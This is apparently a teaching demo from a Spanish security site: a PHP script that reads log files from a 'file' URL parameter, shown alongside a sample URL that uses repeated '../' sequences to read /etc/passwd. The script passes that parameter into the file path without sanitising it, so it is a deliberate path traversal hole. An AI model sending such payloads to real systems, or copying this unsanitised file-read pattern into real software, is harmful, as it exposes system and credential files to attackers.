https://hackingyseguridad.com/traversal.php?file=../../../../../../../../../../etc/passwd

<?php
$server_name = $_SERVER['SERVER_NAME'];
if ((stripos($server_name, 'localhost') === false) && (stripos($server_name, 'hackingyseguridad.com') === false)) {
    die;
}
if (!isset($_GET['file'])) {
    die;
}


$tipo_log   = (stripos($_GET['file'], 'error') === FALSE) ? "correctas" : "errores";
$path        = "var/logs/activaciones/$tipo_log/" . $_GET['file'];

if (!file_exists($path)) {
    die("Error cargando log. No existe o es incorrecto");
}

echo "<pre>". file_get_contents($path) . "</pre>";
